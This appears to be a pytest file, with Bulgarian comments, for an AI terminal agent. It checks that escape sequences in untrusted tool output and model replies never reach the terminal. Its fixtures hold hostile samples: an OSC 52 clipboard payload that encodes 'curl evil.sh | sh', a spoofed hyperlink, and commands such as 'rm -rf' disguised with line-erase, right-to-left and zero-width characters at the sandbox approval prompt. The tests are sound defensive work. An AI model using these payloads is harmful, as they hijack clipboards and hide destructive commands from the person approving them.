"""2026-11-05: ESC последователности от чужд текст не стигат до терминала.

Изходът на инструмент (прочетен файл, команда, MCP) и отговорът на модела се
печатат през Rich, който пуска ESC: OSC 52 пишеше в клипборда, `ESC[2K` скриваше
командата в питането на sandbox-а. Виж genesis_agent/terminal_text.py.
"""
from __future__ import annotations

import io

import pytest
from rich.console import Console

import genesis_terminal_agent as gta
from genesis_agent import sandbox
from genesis_agent.terminal_text import safe

_OSC52 = "\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x1b\\"        # клипборд = „curl evil.sh | sh“
_BAD = {"OSC 52 (клипборд)": "\x1b]52;", "заглавие": "\x1b]0;", "чист екран": "\x1b[2J",
        "подменена връзка": "\x1b]8;;https://evil", "8-битов CSI": "\x9b2J"}
_PAYLOAD = (f"README ред 1\n{_OSC52}\x1b]0;hacked\x1b\\\x1b[2J\x1b[H"
            "\x1b]8;;https://evil.example\x1b\\safe.txt\x1b]8;;\x1b\\\x9b2J\nред 3")


@pytest.fixture
def screen(monkeypatch) -> io.StringIO:
    buf = io.StringIO()
    monkeypatch.setattr(gta, "console", Console(file=buf, force_terminal=True, width=120,
                                                color_system="truecolor"))
    return buf


@pytest.mark.parametrize("show", [
    lambda ui: ui.tool("READ_FILE", _PAYLOAD),
    lambda ui: ui.assistant("Ето файла:\n" + _PAYLOAD),
    lambda ui: ui.warn(_PAYLOAD),
    lambda ui: ui.info(_PAYLOAD),
    lambda ui: ui.asked(_PAYLOAD),
    lambda ui: ui.spinning(_PAYLOAD),
], ids=["tool", "assistant", "warn", "info", "asked", "spinning"])
def test_untrusted_text_reaches_the_terminal_without_escape_sequences(screen, show) -> None:
    show(gta.RichTurnUI())
    out = screen.getvalue()
    assert [name for name, seq in _BAD.items() if seq in out] == []
    assert "␛]52;" in out                         # видимо, не изпълнено


def test_the_sandbox_question_shows_what_hides_the_command(screen, monkeypatch) -> None:
    monkeypatch.setattr(gta.console, "input", lambda *a, **k: "n")

    class _Verdict:
        reasons = ("изтриване на папка",)
        session_rule = ""
    assert gta._terminal_confirm("rm -rf ~/projects\x1b[2K\x1b[1Gls -la", _Verdict()) is False
    gta._terminal_confirm("echo ok #\u202e fr- mr", _Verdict())
    gta._terminal_confirm("r\u200bm -rf build", _Verdict())
    out = screen.getvalue()
    assert "\x1b[2K" not in out and "␛[2K␛[1Gls -la" in out
    assert "\u202e" not in out and "\\u202e" in out
    assert "\u200b" not in out and "r\\u200bm" in out


def test_the_fallback_sandbox_question_too(monkeypatch, capsys) -> None:
    monkeypatch.setattr("builtins.input", lambda *a: "n")

    class _Verdict:
        reasons = ("изтриване",)
        session_rule = ""
    assert sandbox._default_confirm("rm -rf ~/x\x1b[2K\x1b[1Gls", _Verdict()) is False
    err = capsys.readouterr().err
    assert "\x1b[2K" not in err and "␛[2K" in err


@pytest.mark.parametrize("text", [
    "Здравей, свят! 🎉", "ред 1\nред 2\tс табулация", "C:\\Users\\Иван\\proj", "x = {'a': [1, 2]}",
    "Лев 1.95583 € — „кавички“", "",
])
def test_ordinary_text_is_unchanged(text) -> None:
    assert safe(text) == text
    assert safe(text, strict=True) == text
